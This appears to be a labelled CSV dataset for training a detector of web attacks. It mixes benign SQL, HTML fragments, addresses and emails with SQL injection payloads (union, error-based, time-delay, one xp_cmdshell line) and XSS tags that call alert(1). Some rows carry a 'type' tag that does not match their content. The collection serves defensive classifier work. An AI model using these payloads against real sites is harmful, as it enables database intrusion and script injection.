Text,Label,type
"<marquee draggable=""true"" ondragend=""alert(1)"">test</marquee>",2,xss
"calle homero, 127",0,xss
<i onpointerdown=alert(1)>XSS</i>,2,xss
<figcaption onpointermove=alert(1)>XSS</figcaption>,2,xss
"1""  )   where 3958  =  3958 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
-1468'   )    )     )   or 4875  =  6163#,1,sql
"  SELECT * FROM empty WHERE afraid IN  ( 'appearance', 'track', 'purpose' )  ",0,sql
"	 </span> <span class=""reference-text"">",0,xss
SELECT clearly ( s )  FROM naturally FULL OUTER JOIN,0,xss
"	 </span> <span class=""reference-text"">R. J. Williams and D. Zipser. Gradient-based learning algorithms for recurrent networks and their computational complexity. In Back-propagation: Theory, Architectures and Applications. Hillsdale, NJ: Erlbaum, 1994. ",0,xss
SELECT AVG ( Price ) FROM carried,0,sql
"<caption onpaste=""alert(1)"" contenteditable>test</caption>",2,xss
<tbody onfocusout=alert(1) tabindex=1 id=x></tbody><input autofocus>,2,xss
"1"" where 7015  =  7015 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1,sql
5.57567E+15,0,sql
"  SELECT sillyID AS ID, darkness AS depend FROM basis",0,sql
alide,0,sql
03046730n,0,sql
camisoln,0,xss
"-8166""   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""lcqb""  =  ""lcqb",1,xss
1'   )    )    as tley where 3539  =  3539,1,sql
SELECT * FROM sea FETCH FIRST 3 ROWS ONLY,0,xss
<dir onpointerout=alert(1)>XSS</dir>,2,xss
"  UPDATE cry SET feel =  'operation', City =  'stage' WHERE wrapped =  melted",0,sql
"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",1,sql
SELECT COUNT ( certain ) FROM factory,0,sql
96to3a38,0,sql
" select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1",1,sql
SELECT TOP 3 * FROM whether WHERE spend = 'space',0,xss
cabot@eurograb.tel,0,sql
SELECT TOP 3 * FROM caught SELECT * FROM pretty 3SELECT * FROM beneath,0,sql
a9tr8pfag4,0,sql
"calle dinamarca 14,",0,sql
-2761 or 1144  =  7657-- mfml,1,sql
SELECT * FROM turn FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM stood,0,sql
frechette8@legami.ly,0,xss
SELECT * FROM shelf WHERE sometime  BETWEEN 10 AND 20,0,sql
arceo feliu,0,sql
"<li><a href=""/wiki/Process_control"" title=""Process control"">Process control system </a> </li>",0,xss
" select * from users where id  =  1 or ""_{"" or 1  =  1 -- 1",1,sql
SELECT * FROM something WHERE    NOT parallel = 'deer',0,sql
34192,0,sql
larribea,0,sql
<td id=x tabindex=1 onbeforedeactivate=alert(1)></td><input autofocus>,2,xss
"<div id=""footer"" role=""contentinfo"" >",0,xss
"-8080""  )   as nlos where 8917  =  8917 union all select 8917,8917,8917,8917--",1,sql
"-5606  )   union all select 7118,7118,7118,7118,7118,7118,7118,7118,7118#",1,sql
"  SELECT Orders.primitiverID, Employees.fair, Employees.brief FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.identityID ORDER BY Orders.neighborhoodID",0,sql
t'exec master..xp_cmdshell 'nslookup www.googl ...,1,sql
"   SELECT policeman, sit+ ', ' + wait+ ' ' + whole+ ', ' + without AS older  FROM there",0,sql
trobos 39 4e,0,xss
<ins onpointerover=alert(1)>XSS</ins>,2,xss
8i4trib7ti5a,0,sql
SELECT AVG ( military ) FROM entirely,0,sql
21840329n,0,sql
-5116  )   or   (  8287  =  4930  )  *4930,1,sql
	 </span>,0,xss
tebbe,0,xss
" select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",1,xss
SELECT * FROM treated FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
",@variable",1,sql
"<figure onmouseleave=""alert(1)"">test</figure>",2,xss
"1' where 9241  =  9241 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
"<datalist onmouseout=""alert(1)"">test</datalist>",2,xss
SELECT AVG ( bigger ) FROM surprise,0,sql
"calle mariano garcia, s/n",0,sql
"<data onmouseout=""alert(1)"">test</data>",2,xss
"<style>:target {transform: rotate(180deg);}</style><dialog id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dialog>",2,xss
	 </span> </h3>,0,xss
"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",1,sql
SELECT * FROM finger WHERE magnet NOT BETWEEN 'common' AND 'lucky',0,sql
SELECT * FROM type  WHERE cow NOT LIKE '[rocky]%',0,sql
a4go37a,0,xss
SELECT * FROM bicycle WHERE ten = 'road',0,xss
"	 </span> <span class=""reference-text""><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, p.&#160;204 ",0,xss
"<a href=""/wiki/John_McCarthy_(computer_scientist)"" title=""John McCarthy (computer scientist)"">McCarthy </a> and AI research at <a href=""/wiki/Stanford_Artificial_Intelligence_Laboratory"" class=""mw-redirect"" title=""Stanford Artificial Intelligence Laboratory"">SAIL </a> and <a href=""/wiki/SRI_International"" title=""SRI International"">SRI International </a>:",0,xss
kri!sti,0,sql
SELECT LAST_INSERT_ID (  ) ;,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
<blockquote onpointerover=alert(1)>XSS</blockquote>,2,xss
"1%'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  '%'  =  '",1,sql
"-6405' union all select 8235,8235,8235,8235,8235#",1,xss
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28635 )  ORDER BY meta_id ASC",0,sql
 (  select   (  case when   (  6986  =  6986  )   then 6986 else 6986*  (  select 6986 from mysql.db  )   end   )    ) ,1,xss
22618043g,0,sql
"<style>:target {color:red;}</style><figcaption id=x style=""transition:color 1s"" ontransitionend=alert(1)></figcaption>",2,xss
"<li><a href=""/wiki/Friedrich_Wilhelm_Joseph_Schelling"" title=""Friedrich Wilhelm Joseph Schelling"">Friedrich Schelling </a> </li>",0,xss
"-9208%""   )    )    or 8571  =  8571--",1,sql
" SELECT * FROM student ORDER BY party, golden",0,xss
" SELECT column_name ( s )  FROM cover,temperature",0,sql
"1'  )   and make_set  (  8403  =  8403,8899  )  ",1,sql
ikediek torrades,0,sql
"<style draggable=""true"" ondragend=""alert(1)"">test</style>",2,xss
SELECT * FROM likely WHERE equally = 'is',0,sql
SELECT COUNT ( DISTINCT visit )  FROM prove,0,sql
"<wbr onkeyup=""alert(1)"" contenteditable>test</wbr>",2,xss
"<li><cite id=""CITEREFNeedham1986"" class=""citation book""><a href=""/wiki/Joseph_Needham"" title=""Joseph Needham"">Needham, Joseph </a> (1986). <a href=""/wiki/Science_and_Civilization_in_China"" class=""mw-redirect"" title=""Science and Civilization in China""><i>Science and Civilization in China: Volume 2 </i> </a>. Caves Books Ltd. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Science+and+Civilization+in+China%3A+Volume+2&amp;rft.pub=Caves+Books+Ltd.&amp;rft.date=1986&amp;rft.aulast=Needham&amp;rft.aufirst=Joseph&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<h1 draggable=""true"" ondragend=""alert(1)"">test</h1>",2,xss
"1%""   )    )     )   union all select null#",1,xss
select   (  case when   (  5203  =  6330  )   then 5203 else 5203*  (  select 5203 from mysql.db  )   end  )  #,1,xss
"<html onmouseenter=""alert(1)"">test</html>",2,xss
"<div draggable=""true"" contenteditable>drag me</div><q ondrop=alert(1) contenteditable>drop here</q>",2,xss
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=63"" title=""Edit section: Strong AI hypothesis"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
1%'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   '%'  =  ',1,sql
polvo,0,xss
"-9606%""   )    )     )   union all select 8572,8572,8572,8572,8572,8572,8572,8572,8572--",1,sql
"calle perez galdos 193,",0,sql
SELECT TOP 3 * FROM copy WHERE out = 'cheese',0,sql
-4681 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  # rltx,1,sql
SELECT behind ( s )  FROM last SELECT dawn ( s ) ,0,sql
"<li><a href=""/wiki/Entertainment_robot"" title=""Entertainment robot"">Entertainment </a> </li>",0,xss
<body onbeforeprint=alert(1)>,2,xss
"<object onbeforecut=""alert(1)"" contenteditable>test</object>",2,xss
SELECT City FROM Suppliers ORDER BY City;,0,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 6623 )  ORDER BY meta_id ASC",0,sql
<sub onfocusout=alert(1) tabindex=1 id=x></sub><input autofocus>,2,xss
"1%""  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
millot_power@guejos.sv,0,sql
SELECT * FROM felt WHERE bite = 'feed' LIMIT 3,0,sql
SELECT DISTINCT lovely FROM continued,0,sql
"   SELECT Employees.means, COUNT ( Orders.actuallyID )  AS hurryFROM    ( OrdersINNER JOIN effort ON Orders.appliedID  =  Employees.tankID ) ",0,sql
"<li><a href=""/wiki/Claude_Bernard"" title=""Claude Bernard"">Claude Bernard </a> </li>",0,xss
"1 where 5099  =  5099 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,sql
SELECT * FROM smile 3,0,sql
"-5009  )   where 8463  =  8463 union all select 8463,8463,8463,8463,8463,8463--",1,sql
3ule1s,0,sql
"	 </span>"" </a>. <i>Business Insider </i>. 25 May 2018<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">6 May ",0,xss
SELECT * FROM snow WHERE Price NOT BETWEEN 10 AND 20,0,sql
aricel,0,sql
rebes huasequi,0,sql
"<div role=""note"" class=""hatnote navigation-not-searchable"">Main article: <a href=""/wiki/Artificial_intelligence_in_fiction"" title=""Artificial intelligence in fiction"">Artificial intelligence in fiction </a> </div>",0,xss
SELECT minerals ( s )  FROM folks LEFT JOIN,0,xss
"1'  )   as xhmm where 8092  =  8092 union all select null,null,null--",1,sql
FROM  ( SELECT DISTINCT most FROM earth ) ,0,sql
"<div draggable=""true"" contenteditable>drag me</div><wbr ondragover=alert(1) contenteditable>drop here</wbr>",2,xss
"  SELECT PERIOD_DIFF ( 201710, 201703 ) ;",0,sql
SELECT * FROM band FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM black,0,sql
  <hr/>,0,xss
SELECT any ( s )  FROM close UNION ALL,0,sql
<template onpointerout=alert(1)>XSS</template>,2,xss
1'+  (  select wpbj where 1849  =  1849,1,sql
</ul>,0,xss
1'  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  'xazf'  =  'xazf,1,sql
DELETE FROM behavior WHERE brain = 'unhappy',0,sql
"1%"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""%""  =  """,1,xss
SELECT * FROM entire WHERE chair NOT LIKE 'blanket%',0,sql
"  UPDATE vapor SET pile =  'return', City =  'land' WHERE solve =  longer",0,sql
6660,0,sql
SELECT outline FROM worker UNION ALL SELECT start FROM soap ORDER BY dot,0,sql
34844,0,sql
milton,0,xss
SELECT * FROM nearby WHERE closely BETWEEN several09/01/1996kind AND muscle15/31/1996relationship,0,sql
SELECT saddle ( s )  FROM key SELECT there FROM paragraph,0,sql
"<div draggable=""true"" contenteditable>drag me</div><plaintext ondrop=alert(1) contenteditable>drop here</plaintext>",2,xss
"<li><a href=""/wiki/Idea"" title=""Idea"">Idea </a> </li>",0,xss
SELECT * FROM current ORDER BY blind DESC,0,sql
"1""   )    )    as szxa where 1501  =  1501 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 31078 )  ORDER BY meta_id ASC",0,sql
"<ul><li><a href=""#CITEREFHawkinsBlakeslee2005"">Hawkins &amp; Blakeslee 2005 </a> </li> </ul>",0,xss
"  SELECT * FROM happily WHERE length IN  ( 'pig', 'call', 'ten' )  ",0,sql
"<style>@keyframes slidein {}</style><a style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></a>",2,xss
"  SELECT * FROM broad WHERE orange IN  ( 'coach', 'breakfast', 'respect' )  ",0,sql
"1%""   )    )     )  ",1,sql
"-4045 union all select 6857,6857,6857,6857,6857,6857,6857--",1,sql
"        <span class=""commit"">",0,xss
<rp onfocusout=alert(1) tabindex=1 id=x></rp><input autofocus>,2,xss
hutchins@foreignoffice.sa,0,sql
"  SELECT Orders.towerrID, Employees.them, Employees.its FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.exactlyID ORDER BY Orders.valleyID",0,sql
SELECT * FROM opinion ORDER BY forgot,0,sql
"1' in boolean mode  )   union all select null,null,null,null#",1,sql
-2429%' or 6890  =  5846,1,sql
"<option onbeforecopy=""alert(1)"" contenteditable>test</option>",2,xss
"   SELECT 'Customer' AS Type, ContactName, City, CountryFROM Customers  UNIONSELECT 'Supplier', ContactName, City, Country",0,sql
"   SELECT COUNT ( select ) , easy FROM satellites BY gray",0,xss
SELECT TOP 3 * FROM city,0,sql
vencilln,0,sql
5.1284E+14,0,sql
"INSERT INTO actually  ( sides, year, recognize )  VALUES  ( 'gravity', 'use', 'thumb' )  ",0,sql
cerpa oitavn,0,sql
"<li id=""cite_note-Dartmouth_conference-31""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Dartmouth_conference_31-0"">^ </a> </b> ",0,xss
SELECT spring ( s )  FROM salmon LEFT JOIN,0,sql
4ip7237o8h2dira,0,sql
"<dt><a class=""reference internal"" href=""topics/architecture.html""><span class=""doc"">Architecture overview",0,xss
narrillos del lamo,0,xss
fernald,0,xss
"<li class=""toclevel-2 tocsection-41""><a href=""#Law-related_professions""><span class=""tocnumber"">7.6 ",0,xss
"-5518  )   as yvqm where 7360  =  7360 union all select 7360,7360#",1,xss
SELECT * FROM town WHERE industrial = 'under'  AND City = 'mill',0,sql
	 </span>,0,xss
DELETE FROM tomorrow WHERE solar = 'to',0,sql
"<style>:target {color:red;}</style><audio id=x style=""transition:color 1s"" ontransitionend=alert(1)></audio>",2,xss
<input4 onpointerleave=alert(1)>XSS</input4>,2,xss
SELECT * FROM  ( SELECT alive FROM fruit ) ,0,sql
"1%'   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,sql
SELECT * FROM balance WHERE return = 'atomic'  OR neck = 'plant',0,sql
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><applet id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></applet>",2,xss
"-2518' union all select 6818,6818,6818,6818,6818,6818#",1,sql
"<tbody draggable=""true"" ondragstart=""alert(1)"">test</tbody>",2,xss
	 </span>(1879) </li>,0,xss
"1'   )    )    as uuuk where 7234  =  7234 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,sql
"<ul><li><a href=""/wiki/Evolutionary_robotics"" title=""Evolutionary robotics"">Evolutionary </a> </li>",0,xss
	 </span>,0,xss
" SELECT column_name ( s ) FROM table1 T1, table1 T2  WHERE ",0,sql
"<div draggable=""true"" contenteditable>drag me</div><aside ondragover=alert(1) contenteditable>drop here</aside>",2,xss
"<blink onkeydown=""alert(1)"" contenteditable>test</blink>",2,xss
"<spacer onpaste=""alert(1)"" contenteditable>test</spacer>",2,xss
ag2u7a,0,sql
dieasl_yannatos@vilainstal.coop,0,sql
anything' or 'x'  =  'x,1,xss
"1""   )    )    union all select null,null,null,null,null,null,null,null,null--",1,sql
"<li><a href=""/wiki/Paradigm"" title=""Paradigm"">Paradigm </a> </li>",0,xss
<xmp id=x tabindex=1 ondeactivate=alert(1)></xmp><input id=y autofocus>,2,xss
<shadow onpointerenter=alert(1)>XSS</shadow>,2,xss
SELECT * FROM  ( SELECT view FROM shallow ) ,0,xss
"<style>:target {transform: rotate(180deg);}</style><object id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></object>",2,xss
"xiprer 61, 2-a",0,sql
"select count  (  *  )   from generate_series  (  1,5000000  )   and ""%""  =  """,1,sql
"  SELECT practiceID AS ID, key AS across FROM camp",0,sql
casanellas berlingery,0,xss
cebrones del ro,0,xss
marbella,0,sql
escalona,0,sql
SELECT * FROM could WHERE corner NOT BETWEEN 'certainly' AND 'oxygen',0,xss
"1' in boolean mode  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
"1   )    )    union all select null,null,null,null,null--",1,sql
waitfor delay '0:0:5' and    (    (   7619  =  7619,1,sql
"<li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, pp.&#160;209–210 </li>",0,xss
c39ine8ra,0,sql
8.60573E+15,0,sql
 ,0,xss
"1   )    )    as bebl where 2597  =  2597   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1,sql
"plaa tarent, 117, 2-h",0,sql
"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,1,sql
"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",1,sql
SELECT certainly ( s FROM hurt RIGHT JOIN,0,sql
"	 <div style=""padding:0em 0.25em"">",0,xss
"<script type=""text/javascript"" src=""_static/readthedocs-data.js""></script>",0,xss
"<figcaption onclick=""alert(1)"">test</figcaption>",2,xss
"<section oncut=""alert(1)"" contenteditable>test</section>",2,xss
SELECT former ( s FROM heavy RIGHT JOIN,0,sql
arabele,0,sql
SELECT * FROM straw WHERE shore NOT BETWEEN 'meat' AND 'port',0,sql
SELECT * FROM everyone FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
aylln tamallangos,0,sql
SELECT rock FROM carbon UNION SELECT oil FROM home ORDER BY independent,0,sql
"1'  )   where 3579  =  3579   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1,sql
SELECT * FROM worse 3,0,sql
"	 </span> <span class=""reference-text"">The act of doling out rewards can itself be formalized or automated into a ""<a href=""/wiki/Reward_function"" class=""mw-redirect"" title=""Reward function"">reward function </a>"". ",0,xss
"<textarea onmousemove=""alert(1)"">test</textarea>",2,xss
"<li><cite id=""CITEREFHaugeland1985"" class=""citation book""><a href=""/wiki/John_Haugeland"" title=""John Haugeland"">Haugeland, John </a> (1985). <i>Artificial Intelligence: The Very Idea </i>. Cambridge, Mass.: MIT Press. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-262-08153-5"" title=""Special:BookSources/978-0-262-08153-5""><bdi>978-0-262-08153-5 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Artificial+Intelligence%3A+The+Very+Idea&amp;rft.place=Cambridge%2C+Mass.&amp;rft.pub=MIT+Press&amp;rft.date=1985&amp;rft.isbn=978-0-262-08153-5&amp;rft.aulast=Haugeland&amp;rft.aufirst=John&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
<main onpointerleave=alert(1)>XSS</main>,2,xss
"-6519'   )    )    as tdlt where 5040  =  5040 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,sql
"  SELECT library,making,fed FROM spoken LEFT JOIN Orders ON slope.begunID =  lesson.transportation ORDER BY split.row",0,sql
"  SELECT DAYOFWEEK ( ""2017-06-15"" ) ;",0,xss
SELECT * FROM measure WHERE too = 'beginning' FETCH FIRST 3 ROWS ONLY,0,xss
enaltecedor,0,xss
SELECT * FROM lose 3,0,xss
	 </span> </h2>,0,xss
SELECT * FROM laid WHERE NOT further = 'accident'  AND NOT perhaps = 'cup',0,sql
-1432 order by 1#,1,sql
SELECT * FROM beside WHERE wise = 'frog'  AND City = 'sets',0,sql
"<li><a href=""/wiki/Modeling_language"" title=""Modeling language"">Modeling language </a> </li>",0,xss
SELECT * FROM Customers  WHERE CustomerName LIKE '_r%';,0,sql
43427,0,sql
WHERE EXISTS  ( SELECT ProductName FROM   Products WHERE SupplierId  =  Suppliers.supplierId AND Price < 20 ) ;,0,sql
DELETE FROM Customers;,0,sql
"INSERT INTO something  ( figure, sail, mad )  VALUES  ( 'announced', 'example', 'very' )  ",0,sql
6572,0,xss
d2s7sp79ro,0,sql
cigales,0,sql
"<li><a href=""/wiki/Video_game"" title=""Video game"">Video games </a> </li>",0,xss
"<div draggable=""true"" contenteditable>drag me</div><dd ondrop=alert(1) contenteditable>drop here</dd>",2,xss
c/ grabador david roberts 154 1-h,0,sql
36677303p,0,sql
SELECT bush ( s )  FROM weigh UNION,0,sql
"<mark onkeyup=""alert(1)"" contenteditable>test</mark>",2,xss
"<video oncanplay=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",2,xss
1'||  (  select 'zoqo' from dual where 2063  =  2063,1,sql
SELECT * FROM  ( SELECT maybe FROM moment ) ,0,sql
1   )    )    as zpvn where 2767  =  2767 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1,xss
"<style>@keyframes x{}</style><multicol style=""animation-name:x"" onanimationstart=""alert(1)""></multicol>",2,xss
"<em onmousedown=""alert(1)"">test</em>",2,xss
<td id=x tabindex=1 onactivate=alert(1)></td>,2,xss
espinoza@canariasatuaire.lb,0,sql
17488,0,sql
"calle valencia de don juan 161, 7?d",0,sql
"<iframe onbeforecopy=""alert(1)"" contenteditable>test</iframe>",2,xss
"<label onmouseleave=""alert(1)"">test</label>",2,xss
;waitfor delay '0:0:__TIME__'--,1,sql
" select * from users where id  =  '1' <@._ union select 1,version  (    )   -- 1'",1,sql
select * from users where id  =  1 + $+%\ or 1  =  1 -- 1,1,sql
<section onpointerover=alert(1)>XSS</section>,2,xss
SELECT * FROM swung ORDER BY recent DESC,0,xss
"<listing onmouseout=""alert(1)"">test</listing>",2,xss
"<template onkeypress=""alert(1)"" contenteditable>test</template>",2,xss
	 </span> </h3>,0,xss
SELECT * FROM chapter,0,sql
SELECT * FROM copy  WHERE year NOT LIKE '[forget]%',0,xss
"-7981%"" union all select 4532,4532,4532,4532,4532,4532,4532#",1,sql
kirland-lincovsky@la-sexta-f1.fo,0,sql
"<li><a href=""/wiki/Domestic_robot"" title=""Domestic robot"">Domestic </a> </li>",0,xss
"1'+  (  select syrz where 7699  =  7699 union all select null,null,null#",1,xss
1.57143E+15,0,sql
SELECT * FROM building WHERE shout NOT BETWEEN 'she' AND 'round',0,xss
"	 </span> <span class=""toctext"">Deep recurrent neural networks ",0,xss
"<div draggable=""true"" contenteditable>drag me</div><tr ondrop=alert(1) contenteditable>drop here</tr>",2,xss
"  SELECT MAKEDATE ( 2017, 100 ) ;",0,sql
"<li><a href=""/wiki/Glossary_of_physics"" title=""Glossary of physics"">Physics </a> </li>",0,xss
"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a>, chpt. 3 </li> </ul>",0,xss
"<li><a href=""/wiki/Homeostasis"" title=""Homeostasis"">Homeostasis </a> </li>",0,xss
"calle calderon de la barca, 141",0,sql
SELECT * FROM  ( SELECT right FROM world ) ,0,sql
"1,  (  select   (  case when   (  2106  =  2106  )   then   (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   else 2106*  (  select 2106 from master..sysdatabases  )   end   )    )   ",1,sql
reich.puffy@g-audi.pe,0,xss
"-7741'  )   where 8271  =  8271 union all select 8271,8271,8271,8271,8271,8271,8271#",1,sql
-3598  )   union all select 2264#,1,sql
DELETE FROM method,0,sql
<svg><menuitem onload=alert(1)></menuitem>,2,xss
DELETE FROM somehow WHERE factor = 'fruit',0,sql
barruecopardo,0,sql
"<li id=""cite_note-47""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-47"">^ </a> </b> ",0,xss
 UPDATE slipped SET field = 'pleasant'WHERE ocean = 'hungry',0,sql
"	 </span> <span class=""reference-text""><a href=""#CITEREFKatz2012"">Katz 2012 </a>. ",0,xss
"1,updatexml  (  2917,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  2917  =  2917,1   )    )     )  ,0x717a767a71  )  ,8295  )  ",1,sql
SELECT DISTINCT hang FROM sudden,0,sql
"-3860' union all select 3510,3510,3510#",1,sql
"   SELECT rod, create, seldomFROM happily WHERE idea  IS NOT NULL",0,sql
SELECT * FROM typical ORDER BY struggle,0,xss
"<li id=""cite_note-118""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-118"">^ </a> </b> ",0,xss
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Software_development"" title=""Software development"">Software development </a> </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
kriz,0,sql
"1'||  (  select 'bmyt' from dual where 9407  =  9407 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",1,sql
flo3a,0,xss
SELECT * FROM individual WHERE situation NOT LIKE 'ship%',0,xss
7106,0,sql
<strike onpointerup=alert(1)>XSS</strike>,2,xss
SELECT * FROM hung WHERE that = 'immediately'  OR find = 'search',0,sql
	 </span>,0,xss
"<dir onbeforepaste=""alert(1)"" contenteditable>test</dir>",2,xss
